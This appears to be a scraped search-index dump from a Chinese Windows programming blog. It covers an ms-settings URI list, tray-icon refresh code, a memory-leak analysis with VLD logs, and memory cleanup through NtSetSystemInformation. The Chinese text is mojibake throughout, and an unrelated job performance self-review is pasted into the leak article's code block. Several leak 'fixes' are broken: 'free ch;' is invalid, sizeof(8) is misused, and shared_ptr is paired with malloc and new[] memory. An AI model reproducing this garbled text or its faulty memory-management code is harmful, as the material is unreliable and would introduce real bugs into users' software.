ms-settings:easeofaccess-keyboard Devices Location (share between apps) ms-settings:privacy-location Privacy Lock screen ms-settings:lockscreen Security Magnifier ms-settings:easeofaccess-magnifier Accessibility Manage known Wi-Fi ms-settings:network-wifisettings Network Manage sound devices (disable/test) ms-settings:sound-devices Audio Messaging (share between apps) ms-settings:privacy-messaging Privacy Microphone (share between apps) ms-settings:privacy-microphone Privacy Mobile Hotspot ms-settings:network-mobilehotspot Network Motion (share between apps) ms-settings:privacy-motion Privacy Mouse ms-settings:easeofaccess-mouse Accessibility Mouse &amp; Touchpad Devices ms-settings:mousetouchpad Devices Mouse Pointer (Cursor &amp; pointer, build 17040+) ms-settings:easeofaccess-cursorandpointersize Accessibility Mouse Pointer (Cursor &amp; pointer, build 17040+) ms-settings:easeofaccess-mousepointer Accessibility Multitasking ms-settings:multitasking Display Narrator ms-settings:easeofaccess-narrator Audio Network &amp; Internet ms-settings:network Network Network Status ms-settings:network-status Network Night light settings ms-settings:nightlight Customisation Notifications (share between apps) ms-settings:privacy-notifications Privacy Notifications and Actions ms-settings:notifications Customisation Offline Maps ms-settings:maps Apps Online Speech recognition ms-settings:privacy-speech Privacy Optional features ms-settings:optionalfeatures Apps Other options ms-settings:easeofaccess-otheroptions Accessibility Personalization ms-settings:personalization Customisation Picture Library (share between apps) ms-settings:privacy-pictures Privacy Power &amp; Sleep ms-settings:powersleep Power Printers ms-settings:printers Devices Privacy ms-settings:privacy Privacy Projecting to this PC ms-settings:project Display Proxy (Network) ms-settings:network-proxy Network Radio (share between apps) ms-settings:privacy-radios Privacy Recovery - Reset/Advanced startup ms-settings:recovery Windows Region ms-settings:regionformatting Region &amp; Language Region &amp; language ms-settings:regionlanguage Region &amp; Language Remember typing patterns ms-settings:privacy-speechtyping Privacy Remote Desktop ms-settings:remotedesktop Network Search Permissions &amp; search history ms-settings:search-permissions Search Search details ms-settings:search-moredetails Search Security Key setup ms-settings:signinoptions-launchsecuritykeyenrollment Security Send Diagnostic Data to Microsoft ms-settings:privacy-feedback-telemetryviewergroup Privacy Set up a kiosk ms-settings:assignedaccess Security Shared experiences ms-settings:crossdevice Network Sign-in options ms-settings:signinoptions Security Software Center (SCCM) softwarecenter: Apps Sound (build 17063+) ms-settings:sound Audio Speech ms-settings:speech Audio Speech recognition (build 17035+) ms-settings:easeofaccess-speechrecognition Accessibility Start Menu ms-settings:personalization-start Customisation Start Menu (choose which folders appear) ms-settings:personalization-start-places Customisation Start Narrator after sign-in ms-settings:easeofaccess-narrator-isautostartenabled Audio Startup (build 17017+) ms-settings:startupapps Customisation Storage Sense ms-settings:storagesense Storage Storage Sense configuration ms-settings:storagepolicies Storage Sync your settings ms-settings:sync Network Tablet mode ms-settings:tabletmode Customisation Taskbar ms-settings:taskbar Apps Tasks (share between apps) ms-settings:privacy-tasks Privacy Text Cursor ms-settings:easeofaccess-cursor Accessibility Themes ms-settings:themes Customisation Touchpad ms-settings:devices-touchpad Devices Troubleshoot - Fix Windows Update ms-settings:troubleshoot Windows Typing ms-settings:typing Accessibility USB ms-settings:usb Devices Unpaired devices (share between apps) ms-settings:privacy-customdevices Privacy VPN ms-settings:network-vpn Network Video Library (share between apps) ms-settings:privacy-videos Privacy Video playback (build 16215+) ms-settings:videoplayback Display Voice activation (apps can listen) ms-settings:privacy-voiceactivation Privacy Webcam (share between apps) ms-settings:privacy-webcam Privacy Wi-Fi ms-settings:network-wifi Network WinUpdate - Active Hours ms-settings:windowsupdate-activehours Security WinUpdate - Advanced options ms-settings:windowsupdate-options Security WinUpdate - Check for updates ms-settings:windowsupdate-action Security WinUpdate - Optional updates ms-settings:windowsupdate-optionalupdates Security WinUpdate - Restart options ms-settings:windowsupdate-restartoptions Security WinUpdate - Update history ms-settings:windowsupdate-history Security Windows Hello face setup ms-settings:signinoptions-launchfaceenrollment Security Windows Hello fingerprint setup ms-settings:signinoptions-launchfingerprintenrollment Security Windows Insider Program (betaâ€™s) ms-settings:windowsinsider Windows Windows Search ms-settings:cortana-windowssearch Search Windows Security (Defender) ms-settings:windowsdefender Security Windows Security at a glance windowsdefender: Security Windows Update ms-settings:windowsupdate Security Your info (Microsoft account) ms-settings:yourinfo Security","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"ms-settings","slug":"ms-settings","permalink":"https://hodlyounger.github.io/tags/ms-settings/"},{"name":"å¿«æ·æ–¹å¼","slug":"å¿«æ·æ–¹å¼","permalink":"https://hodlyounger.github.io/tags/%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€Windowsã€‘åˆ·æ–°æ‰˜ç›˜å›¾æ ‡","date":"2023-10-27T01:24:02.024Z","path":"A_OS/Windows/API/ã€winapiã€‘åˆ·æ–°æ‰˜ç›˜å›¾æ ‡/","text":"[toc] èƒŒæ™¯ ç¨‹åºå´©æºƒç»“æŸåï¼Œåˆ›å»ºçš„ç³»ç»Ÿæ‰˜ç›˜åŒºå›¾æ ‡å¹¶ä¸èƒ½è¢«åˆ·æ–°æ‰ï¼Œé‡å¯å®¢æˆ·ç«¯ç¨‹åºåï¼Œæ‰˜ç›˜åŒºä¼šæœ‰ä¸¤ä¸ªä¸€æ ·çš„å›¾æ ‡ã€‚ è§£å†³æ–¹æ¡ˆ æ–¹æ¡ˆä¸€ è°ƒç”¨ä»¥ä¸‹ä»£ç æ¨¡æ‹Ÿé¼ æ ‡hoveræ“ä½œéå†ç³»ç»Ÿæ‰˜ç›˜åŒºå›¾æ ‡ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#ifdef Q_OS_WIN //åˆ·æ–°æ‰˜ç›˜å›¾æ ‡ auto RefreshTrayIcon = []() &#123; //ä»»åŠ¡æ çª—å£ HWND hShellTrayWnd = ::FindWindow(L&quot;Shell_TrayWnd&quot;, NULL); //ä»»åŠ¡æ å³è¾¹æ‰˜ç›˜å›¾æ ‡+æ—¶é—´åŒº HWND hTrayNotifyWnd = ::FindWindowEx(hShellTrayWnd, 0, L&quot;TrayNotifyWnd&quot;, NULL); //ä¸åŒç³»ç»Ÿå¯èƒ½æœ‰å¯èƒ½æ²¡æœ‰è¿™å±‚ HWND hSysPager = ::FindWindowEx(hTrayNotifyWnd, 0, L&quot;SysPager&quot;, NULL); //æ‰˜ç›˜å›¾æ ‡çª—å£ HWND hToolbarWindow32; if (hSysPager) &#123; hToolbarWindow32 = ::FindWindowEx(hSysPager, 0, L&quot;ToolbarWindow32&quot;, NULL); &#125; else &#123; hToolbarWindow32 = ::FindWindowEx(hTrayNotifyWnd, 0, L&quot;ToolbarWindow32&quot;, NULL); &#125; if (hToolbarWindow32) &#123; RECT r; ::GetWindowRect(hToolbarWindow32, &amp;r); int width = r.right - r.left; int height = r.bottom - r.top; int iconWidth = GetSystemMetrics(SM_CXSMICON); // å›¾æ ‡åŸºå‡†å®½åº¦ int iconHeight = GetSystemMetrics(SM_CYSMICON); // å›¾æ ‡åŸºå‡†é«˜åº¦ //ä»ä»»åŠ¡æ ä¸­é—´ä»å·¦åˆ°å³ MOUSEMOVEä¸€éï¼Œæ‰€æœ‰å›¾æ ‡çŠ¶æ€ä¼šè¢«æ›´æ–° for (int x = 1; x &lt; width; x+=iconWidth) &#123; for (int y = 1; y &lt; height; y+=iconHeight) &#123; ::SendMessage(hToolbarWindow32, WM_MOUSEMOVE, 0, MAKELPARAM(x, y)); &#125; &#125; &#125; &#125;; // RefreshTrayIcon();#endif // Q_OS_WIN æ–¹æ¡ˆäºŒ é‡æ–°å¯åŠ¨è¿›ç¨‹çš„æ—¶å€™å…ˆåˆ é™¤å†åˆ›å»ºï¼Œä½†æ˜¯éœ€è¦é€šè¿‡æ·»åŠ  uID å’Œ guidItem æ¥è¯†åˆ«å·²åˆ›å»ºçš„æ‰˜ç›˜å›¾æ ‡ 1234567891011 // è®¾ç½® uid å’Œ guiditemm_nid.uID = GUID_TrayIcon.Data2;if (QSysInfo::WindowsVersion &gt;= QSysInfo::WV_WINDOWS7)&#123; m_nid.uFlags |= NIF_GUID; m_nid.guidItem = GUID_TrayIcon;&#125; // åˆ é™¤ Shell_NotifyIcon(NIM_DELETE, &amp;m_nid);","tags":[{"name":"windows/æ‰˜ç›˜","slug":"windows-æ‰˜ç›˜","permalink":"https://hodlyounger.github.io/tags/windows-%E6%89%98%E7%9B%98/"},{"name":"tray","slug":"tray","permalink":"https://hodlyounger.github.io/tags/tray/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€å†…å­˜æ³„æ¼ã€‘åˆ†æå®æˆ˜","date":"2023-10-27T01:24:02.023Z","path":"A_OS/Windows/å†…å­˜æ³„æ¼/å®æˆ˜/ã€å†…å­˜æ³„æ¼ã€‘åˆ†æå®æˆ˜/","text":"[toc] å‰è¨€ æœ¬æ–‡ä¸ºé¡¹ç›®ä¸­æœåŠ¡ç¨‹åºçš„å†…å­˜æ³„æ¼ï¼ŒæŒ‘äº†å…¶ä¸­ä¸€éƒ¨åˆ†æ¯”è¾ƒå¸¸è§çš„å†…å­˜æ³„æ¼è¿›è¡Œåˆ†æå’Œä¿®æ”¹ã€‚ å…³äºå†…å­˜æ³„æ¼å’Œåˆ†æçš„æ–‡ç« å¯æŸ¥çœ‹åšå®¢ç›¸å…³æ–‡ç« ï¼Œæœ‰ UMDH å’Œ vld ä¸¤ç§æ–¹å¼ï¼Œå¯æ ¹æ®ä¸ªäººéœ€æ±‚å±•å¼€åˆ†æã€‚ æ³„æ¼åˆ†ç±» # malloc å†…å­˜æ³„æ¼ ä¸‹è¿°æ—¥å¿—ä¸ºä¸€æ¬¡ malloc æœªæ­£ç¡®é‡Šæ”¾å¯¼è‡´çš„å†…å­˜æ³„æ¼ã€‚è¿™ç§é—®é¢˜æ¯”è¾ƒå¸¸è§ï¼Œä¸ç”¨å¤šè¯´ã€‚ 123ntdll.dll!RtlAllocateHeap()***\\heap\\malloc_base.cpp (34): XXX.dll!_malloc_base() + 0xF bytesXXX.dll!_event_debugx() + 0x1A7 bytes è§£å†³æ–¹æ¡ˆï¼š æ ¹æ®æç¤ºçš„ä½ç½®æ‰¾åˆ°å¹¶é‡Šæ”¾è¯¥å†…å­˜ã€‚ 123char *ch = (char*)malloc(sizeof(8));free ch;ch = NULL; å¦å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆç®¡ç†è¯¥æŒ‡é’ˆï¼š 12char *ch = (char*)malloc(sizeof(8));shared_ptr&lt;char&gt; spCh(ch); # new å†…å­˜æ³„æ¼ å…³äº new çš„å†…å­˜æ³„æ¼åˆ†æå†™äº†ä¸€æ®µä»£ç ç”¨æ¥å±•ç¤ºä¸€ä¸‹ï¼š æ³¨ï¼šä»£ç  Section2 éƒ¨åˆ†ä¸ºä¸€ä¸ªå´©æºƒä»£ç ï¼Œå †å†…å­˜ç”³è¯·åä½¿ç”¨æ—¶ä¸€å¤„ï¼Œè€Œåœ¨å †å†…å­˜ç”³è¯·å’Œé‡Šæ”¾æ—¶ä»¥åŠç¨‹åºç»“æŸæ—¶é‡Šæ”¾å †å†…å­˜æ—¶ï¼Œéƒ½ å­˜åœ¨å †æº¢å‡ºæ£€æŸ¥ ï¼Œæ£€æŸ¥ç‚¹ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´ç¨‹åºå¥”æºƒã€‚ 1234567891011121314151617// ä»£ç  Section2// è¯¥å‡½æ•°ä»£ç è¿˜æ¶‰åŠå¥”æºƒé—®é¢˜int* test_heap_alloc()&#123; int* pTable = new int(256); // ç”³è¯·ä¸€ä¸ªintç»“æ„ä½“å˜é‡ï¼Œåˆå§‹å€¼ä¸º256; for (int i = 0; i &lt; 256; i++) pTable[i] = i; return pTable;&#125;int main ()&#123; test_heap_alloc(); // æ‰§è¡Œä¸Šè¿°ä»£ç ä¹‹åå†å»ä¸‹è¾¹è¿™å¥ç”³è¯·å †å†…å­˜ä¼šå¥”æºƒã€‚ char* p = new char(0); // ç”³è¯·ä¸€ä¸ªå­—èŠ‚ï¼Œå†…å®¹åˆå§‹åŒ–ä¸º0 return 0;&#125; ä»¥ä¸‹ä¸º vld ç”Ÿæˆçš„æ³„æ¼æ—¥å¿—ï¼š 123456789101112WARNING: Visual Leak Detector detected memory leaks!---------- Block 1 at 0x010AAC68: 4 bytes ---------- Leak Hash: 0x03729B3D, Count: 1, Total 4 bytes Call Stack (TID 33760): ucrtbase.dll!malloc() d:\\agent\\_work\\3\\s\\src\\vctools\\crt\\vcstartup\\src\\heap\\new_scalar.cpp (35): vldforptr.exe!operator new() + 0x8 bytes d:\\code_source\\c++\\vs2019\\vldforptr\\vldforptr.cpp (45): vldforptr.exe!main() + 0x7 bytes KERNEL32.DLL!BaseThreadInitThunk() + 0x19 bytes ntdll.dll!RtlGetAppContainerNamedObjectPath() + 0x11E bytes ntdll.dll!RtlGetAppContainerNamedObjectPath() + 0xEE bytes Data: 00 00 00 00 ........ ........ è§£å†³æ–¹æ¡ˆï¼š è°ƒç”¨ delete é‡Šæ”¾ new å‡ºæ¥çš„å†…å­˜ã€‚ é—®é¢˜ï¼šä¸ç¡®å®šå˜é‡ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å®Œçš„ï¼Œå¦‚ä½•é‡Šæ”¾ï¼Ÿ 123// ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆchar *ch = new char[256];std::shared_ptr&lt;char&gt; spCh(ch); # strdup å†…å­˜æ³„æ¼ strdupå‡½æ•°è¯´æ˜ï¼š åŠŸèƒ½ï¼šå°†å­—ç¬¦ä¸²æ‹·è´åˆ°æ–°å»ºçš„ä½ç½®å¤„ è¿”å›å€¼ ï¼šè¿”å›ä¸€ä¸ªæŒ‡å‘æ–°å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œè¯¥å­—ç¬¦ä¸²æ˜¯å­—ç¬¦ä¸²sçš„å‰¯æœ¬ï¼Œå¦‚æœåˆ†é…ç©ºé—´å¤±è´¥ï¼Œåˆ™è¿”å›NULLå€¼ã€‚æ–°å­—ç¬¦ä¸²çš„å†…å­˜ç”±strdupå‡½æ•°åŸå‹å†…éƒ¨çš„mallocï¼ˆï¼‰è·å¾—ï¼Œéœ€ç”¨freeï¼ˆï¼‰é‡Šæ”¾ã€‚ 123ntdll.dll!RtlAllocateHeap()minkernel\\crts\\ucrt\\src\\appcrt\\heap\\malloc_base.cpp (34): XXX.dll!_malloc_base() + 0xF bytesXXX.dll!BUF_strndup() + 0x8A bytes æŠŠè¿”å›å†…å­˜åœ°å€çš„é‡Šæ”¾æƒäº¤ç»™äº†åˆ«çš„å˜é‡ï¼Œè¿™å°±å¾ˆå®¹æ˜“å¿˜è®°é‡Šæ”¾ï¼Œæ‰€ä»¥ strdup è¿™ä¸ªå‡½æ•°ä¹Ÿå¾ˆå®¹æ˜“é€ æˆå†…å­˜æ³„æ¼ã€‚ æ•´ç† # _malloc_base _malloc_base å°±æ˜¯ç¼–è¯‘å™¨ç¼–è¯‘ä¹‹åçš„ mallocã€‚ æŸ¥çœ‹vldçš„logå¯ä»¥çœ‹åˆ°ï¼Œå †æ ˆæ˜¾ç¤ºçš„ _malloc_base æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸º minkernel\\crts\\ucrt\\src\\appcrt\\heap\\malloc_base.cppï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯ malloc å£°æ˜å’Œå®šä¹‰çš„æ–‡ä»¶ã€‚ 1234567é¢†å¯¼æ‚¨å¥½ï¼ä»¥ä¸‹å†…å®¹ä¸ºæœ¬æ¬¡ç»©æ•ˆæœŸé—´æˆ‘çš„å·¥ä½œæ¦‚è¿°ä»¥åŠè‡ªæˆ‘è¯„ä»·ã€‚æœ¬æ¬¡ç»©æ•ˆæœŸé—´ï¼Œæˆ‘çš„ä¸»è¦å·¥ä½œå†…å®¹é›†ä¸­åœ¨é›¶ä¿¡ä»»å›½ä¿¡ç‰ˆæœ¬å’Œå¤©æ“é›¶ä¿¡ä»»æ’ä»¶éƒ¨åˆ†ï¼ŒåŒæ—¶ä¹Ÿè´Ÿè´£äº†éƒ¨åˆ†å·¥è¡Œã€æ ‡æ¿çš„éœ€æ±‚å¼€å‘ï¼ˆSPAã€å¼‚å¸¸å‘Šè­¦ã€å‘½ä»¤è¡Œç™»å½•ç­‰ï¼‰ã€‚é›¶ä¿¡ä»»å›½ä¿¡ç‰ˆæœ¬å…±è®¡å‘å¸ƒç‰ˆæœ¬ä¸¤æ¬¡ï¼Œå‡åœ¨å‘å¸ƒç‰ˆæœ¬ä¹‹å‰å®Œæˆäº†éœ€æ±‚çš„å¼€å‘å’Œbugçš„ä¿®å¤ï¼Œæ¶‰åŠçš„éœ€æ±‚åå¤šé¡¹ï¼Œéœ€æ±‚ææµ‹å‡é€šè¿‡ï¼Œåœ¨å®Œæˆéœ€æ±‚çš„åŒæ—¶ï¼Œæ•´ç†ç¼–å†™äº†ç›¸åº”çš„æŠ€æœ¯å¼€å‘æ–‡æ¡£åå¤šç¯‡ï¼ŒåŒæ—¶ä¹Ÿè¡¥å……äº†é›¶ä¿¡ä»»å®¢æˆ·ç«¯éƒ¨åˆ†é…ç½®æ–‡ä»¶çš„è¯´æ˜æ–‡æ¡£ã€‚å¼€å‘åŒæ—¶ï¼Œé’ˆå¯¹å›½ä¿¡é›¶ä¿¡ä»»ç‰ˆæœ¬çš„å‡çº§æ•…éšœé—®é¢˜ï¼ˆå‡çº§å¤±è´¥ï¼Œå‡çº§æ£€æµ‹é—®é¢˜ï¼‰ï¼Œä¼˜åŒ–äº†è¯¥éƒ¨åˆ†çš„é€»è¾‘ï¼Œå¯¹æ•´ä¸ªå®¢æˆ·ç«¯çš„æ— é€»è¾‘ä»£ç å’Œæ—¥å¿—éƒ¨åˆ†è¿›è¡Œäº†ä¼˜åŒ–ï¼Œä»¥ä¾¿äºåç»­å¿«é€Ÿå®šä½å’Œåˆ†æé—®é¢˜ï¼Œå›½ä¿¡å‘å¸ƒç‰ˆæœ¬æœŸé—´ï¼Œä¸ºä¿è¯å‡ºåŒ…é¡ºåˆ©ï¼Œè§£å†³ä¸´æ—¶å‡ºç°çš„é—®é¢˜ï¼Œä¸å›¢é˜Ÿä¸€èµ·è§£å†³é—®é¢˜å¹¶å®Œæˆç‰ˆæœ¬å‘å¸ƒçš„ä»»åŠ¡ï¼›é›¶ä¿¡ä»»æ’ä»¶éƒ¨åˆ†ï¼Œæ’ä»¶çš„å¼€å‘è®©æˆ‘å­¦ä¹ åˆ°äº†è¾ƒå¤šæ¡†æ¶æ–¹é¢çš„çŸ¥è¯†ï¼Œäº†è§£äº†æ’ä»¶çš„å¼€å‘ä»¥åŠå›¢é˜Ÿè”è°ƒçš„è¿‡ç¨‹ï¼Œé›¶ä¿¡ä»»æ’ä»¶çš„å¼€å‘åœ¨å›¢é˜Ÿå¸®åŠ©ä¸‹å¼€å‘è¾ƒä¸ºé¡ºåˆ©ï¼Œå¹¶ä¸”æŒ‰æ—¶ææµ‹ï¼Œä¸”å®Œæˆåº¦è¾ƒé«˜ï¼Œæ•…éšœéƒ¨åˆ†ç›¸å¯¹è¾ƒå°‘ï¼Œè°ƒæ•´éƒ¨åˆ†åŸºæœ¬ä¸ºä¸šåŠ¡æ–¹é¢çš„é€»è¾‘è°ƒæ•´ã€‚å·¥è¡Œå’Œæ ‡æ¿çš„éœ€æ±‚ä¹Ÿæ˜¯åœ¨è®¡åˆ’å†…å®Œæˆäº†éœ€æ±‚çš„å¼€å‘å¹¶ææµ‹æˆåŠŸï¼Œæœ¬æ¬¡ç»©æ•ˆæœŸé—´ï¼Œå·¥ä½œå……å®ï¼Œå¦‚æœŸå®Œæˆäº†å„é¡¹éœ€æ±‚å¼€å‘ã€‚ä¸è¶³å°±æ˜¯å¤šä¸ªéœ€æ±‚çš„å¼€å‘å’Œææµ‹è¿‡ç¨‹ç›¸å¯¹è¾ƒæ…¢ï¼Œç”±äºç¯å¢ƒï¼ˆtacï¼‰é—®é¢˜ï¼Œåœ¨å¼€å‘è‡ªæµ‹å’Œææµ‹è¿‡ç¨‹ä¸­å‡ºç°äº†æ•ˆæœä¸ä¸€è‡´çš„æƒ…å†µï¼Œåœ¨ä»¥åå¼€å‘ä¸­éœ€è¦æ³¨æ„è¯¥æ–¹é¢é—®é¢˜å¯¹å¼€å‘ææµ‹çš„å½±å“ï¼Œææµ‹å‰å°½é‡ä¿è¯è‡ªæµ‹å®Œæ•´ï¼Œéœ€æ±‚å®Œå–„ã€‚ä»¥ä¸Šå°±æ˜¯æœ¬æœŸè‡ªæˆ‘è¯„ä»·ã€‚","tags":[{"name":"å†…å­˜æ³„æ¼","slug":"å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"å®æˆ˜","slug":"å®æˆ˜","permalink":"https://hodlyounger.github.io/tags/%E5%AE%9E%E6%88%98/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å†…å­˜æ³„æ¼","slug":"A-OS/Windows/å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"å®æˆ˜","slug":"A-OS/Windows/å†…å­˜æ³„æ¼/å®æˆ˜","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/%E5%AE%9E%E6%88%98/"}]},{"title":"ã€Winã€‘å†…å­˜æ¸…ç†","date":"2023-10-27T01:24:02.021Z","path":"A_OS/Windows/å†…å­˜æ³„æ¼/ã€Winã€‘å†…å­˜æ¸…ç†/","text":"æ¦‚è¿°ï¼š windowsæ“ä½œç³»ç»Ÿå¦‚æœå®ç°å†…å­˜æ¸…ç† ç›¸å…³å®ç°ï¼š henrypp/memreduct: Lightweight real-time memory management application to monitor and clean system memory on your computer. å·¥å…·ï¼šMem Reduct å‚è€ƒæ–‡ç« ï¼šä½¿ç”¨ NT API æ•´ç†å†…å­˜ç¢ç‰‡ - å¤§è´¤è€…åˆæ˜¥ä»¤æœˆ åœ¨ç³»ç»Ÿè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå†…å­˜ä¸­ä¸å¯é¿å…åœ°ä¼šäº§ç”Ÿä¸€äº›å†…å­˜ç¢ç‰‡ï¼Œè¿™ä¼šå½±å“ç³»ç»Ÿçš„æ‰§è¡Œæ•ˆç‡ï¼Œå› æ­¤é€‚æ—¶æ•´ç†å†…å­˜ç¢ç‰‡æ˜¯æœ‰å¿…è¦çš„ã€‚ ç°åœ¨å¸‚é¢ä¸Šå¤§éƒ¨åˆ†çš„å†…å­˜ç¢ç‰‡æ•´ç†å·¥å…·é€šè¿‡å°½å¯èƒ½è®©ç³»ç»Ÿåˆ†é…å†…å­˜å—æŠŠå°½å¯èƒ½å¤šçš„å†…å­˜å—æŒ¤å…¥äº¤æ¢æ–‡ä»¶ç„¶åå†é‡Šæ”¾ä»¥è¾¾æˆç›®çš„ã€‚ æˆ‘æ„Ÿè§‰è¿™ä¸ªæ–¹æ³•ä¸å¤Ÿä¼˜é›…ï¼Œæ¯•ç«Ÿè¿™è¦æ±‚ä½ çš„å†…å­˜ç¢ç‰‡æ•´ç†å·¥å…·ä¸€å®šè¿è¡Œåœ¨ Native æ¨¡å¼è€Œä¸æ˜¯ WoW å…¼å®¹å±‚ä¸­ï¼Œè­¬å¦‚å¦‚æœä½ çš„å·¥å…·æ˜¯ 32 ä½çš„è¯æœ€å¤šåªèƒ½å‘ç³»ç»Ÿè¯·æ±‚ 4GB çš„å†…å­˜ï¼Œæ— æ³•è¾¾åˆ°ä½ çš„ç›®çš„ã€‚è€Œä¸”ç”±äºæ˜¯è¢«è¿«è®©ç³»ç»ŸæŠŠå†…å­˜å—æŒ¤å…¥äº¤æ¢æ–‡ä»¶ï¼Œäºæ˜¯è¿è¡Œæ•ˆç‡ä¸é«˜ï¼Œ è€Œä¸”ä¹Ÿç»™ç³»ç»Ÿè°ƒåº¦æœºåˆ¶å¸¦æ¥äº†å¾ˆå¤§çš„å½±å“ã€‚ äºæ˜¯æœ¬æ–‡æå‡ºä¸€ç§æ–°çš„å†…å­˜ç¢ç‰‡æ•´ç†æ–¹å¼ï¼Œé€šè¿‡è°ƒç”¨ NT API é€šçŸ¥å†…æ ¸ä¸»åŠ¨å°†å†…å­˜å—ç§»åŠ¨åˆ°äº¤æ¢æ–‡ä»¶ï¼Œäºæ˜¯æ•´ç†é€Ÿåº¦éå¸¸å¿«ï¼Œ è€Œä¸”å¯¹ç³»ç»Ÿè°ƒåº¦æœºåˆ¶çš„å½±å“ä¹Ÿæœ€å°ã€‚ çµæ„Ÿæ¥æº å½“æˆ‘ä½¿ç”¨ Sysinternals Suite çš„ RAMMap å·¥å…·çš„ Empty èœå•çš„åŠŸèƒ½çš„æ—¶å€™ï¼Œå‘ç°é€šè¿‡é€‚å½“çš„é¡ºåºæ“ä½œå¯ä»¥é«˜æ•ˆåœ°æ•´ç†å†…å­˜ç¢ç‰‡ã€‚ äºæ˜¯ç”¨ IDA Pro åˆ†æäº†ä¸‹ RAMMap å·¥å…·çš„ç›¸å…³åŠŸèƒ½ï¼Œå¹¶å¯¹è‡ªå·±çš„å‘ç°è¿›è¡Œæ€»ç»“ï¼Œç¼–å†™ç¤ºä¾‹å’Œæœ¬æ–‡ã€‚ æ“ä½œæ–¹æ³• éœ€è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œä½ çš„äºŒè¿›åˆ¶ã€‚ é¦–å…ˆå¯ç”¨å½“å‰è¿›ç¨‹çš„ SeProfileSingleProcessPrivilege ç‰¹æƒï¼Œç„¶åè°ƒç”¨ NtSetSystemInformationï¼Œåˆ†åˆ«å‘ SystemMemoryListInformation ä¼ å…¥ MemoryEmptyWorkingSets, MemoryFlushModifiedList å’Œ MemoryPurgeStandbyList å³å¯å®Œæˆå†…å­˜ç¢ç‰‡æ•´ç†ã€‚ å‚è€ƒ Mem Reduct çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142if (mask &amp; REDUCT_WORKING_SET) &#123; command = MemoryEmptyWorkingSets; status = NtSetSystemInformation (SystemMemoryListInformation, &amp;command, sizeof (command)); if (!NT_SUCCESS (status)) _r_log (LOG_LEVEL_ERROR, NULL, L&quot;NtSetSystemInformation&quot;, status, L&quot;MemoryEmptyWorkingSets&quot;); &#125; // Standby priority-0 list (vista+) if (mask &amp; REDUCT_STANDBY_PRIORITY0_LIST) &#123; command = MemoryPurgeLowPriorityStandbyList; status = NtSetSystemInformation (SystemMemoryListInformation, &amp;command, sizeof (command)); if (!NT_SUCCESS (status)) _r_log (LOG_LEVEL_ERROR, NULL, L&quot;NtSetSystemInformation&quot;, status, L&quot;MemoryPurgeLowPriorityStandbyList&quot;); &#125; // Standby list (vista+) if (mask &amp; REDUCT_STANDBY_LIST) &#123; command = MemoryPurgeStandbyList; status = NtSetSystemInformation (SystemMemoryListInformation, &amp;command, sizeof (command)); if (!NT_SUCCESS (status)) _r_log (LOG_LEVEL_ERROR, NULL, L&quot;NtSetSystemInformation&quot;, status, L&quot;MemoryPurgeStandbyList&quot;); &#125; // Modified page list (vista+) if (mask &amp; REDUCT_MODIFIED_LIST) &#123; command = MemoryFlushModifiedList; status = NtSetSystemInformation (SystemMemoryListInformation, &amp;command, sizeof (command)); if (!NT_SUCCESS (status)) _r_log (LOG_LEVEL_ERROR, NULL, L&quot;NtSetSystemInformation&quot;, status, L&quot;MemoryFlushModifiedList&quot;); &#125; å®Œæ•´ä»£ç ç¤ºä¾‹ ä»¥ä¸‹ç¤ºä¾‹ä¾èµ–äºç¬”è€…åˆ›å»ºçš„ https://github.com/Chuyu-Team/MINT åº“æä¾›çš„ NT API å®šä¹‰ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;MINT.h&gt;namespace&#123; static HRESULT DefragMemory() &#123; using NtSetSystemInformationType = decltype(::NtSetSystemInformation)*; using RtlNtStatusToDosErrorType = decltype(::RtlNtStatusToDosError)*; NtSetSystemInformationType pNtSetSystemInformation = nullptr; RtlNtStatusToDosErrorType pRtlNtStatusToDosError = nullptr; HMODULE ModuleHandle = ::GetModuleHandleW(L&quot;ntdll.dll&quot;); if (!ModuleHandle) &#123; return E_NOINTERFACE; &#125; pNtSetSystemInformation = reinterpret_cast&lt;NtSetSystemInformationType&gt;( ::GetProcAddress(ModuleHandle, &quot;NtSetSystemInformation&quot;)); if (!pNtSetSystemInformation) &#123; return E_NOINTERFACE; &#125; pRtlNtStatusToDosError = reinterpret_cast&lt;RtlNtStatusToDosErrorType&gt;( ::GetProcAddress(ModuleHandle, &quot;RtlNtStatusToDosError&quot;)); if 